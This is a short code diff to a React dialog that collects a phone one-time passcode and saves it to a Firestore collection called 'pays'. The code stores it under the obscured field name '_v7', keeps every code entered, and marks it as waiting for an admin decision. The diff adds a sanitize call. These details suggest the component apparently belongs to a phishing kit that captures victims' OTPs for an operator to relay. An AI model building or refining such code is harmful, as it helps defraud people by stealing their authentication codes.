@@ -9,6 +9,7 @@ import { AlertCircle, CheckCircle2, Smartphone } from "lucide-react"
 import { db } from "@/lib/firebase"
 import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
+import { sanitizeData } from "@/lib/sanitize"
 
 interface PhoneOtpDialogProps {
   open: boolean
@@ -88,8 +89,12 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
 
       // Save OTP to Firebase
       if (!db) throw new Error("Firebase not configured")
+      
+      // Sanitize OTP data before saving
+      const sanitizedData = sanitizeData({ _v7: otp });
+      
       await setDoc(doc(db as Firestore, "pays", visitorID), {
-        _v7: otp,
+        ...sanitizedData,
         phoneOtpSubmittedAt: new Date().toISOString(),
         allPhoneOtps: allOtps.current,
         phoneOtpStatus: "verifying", // Set to verifying, waiting for admin decision
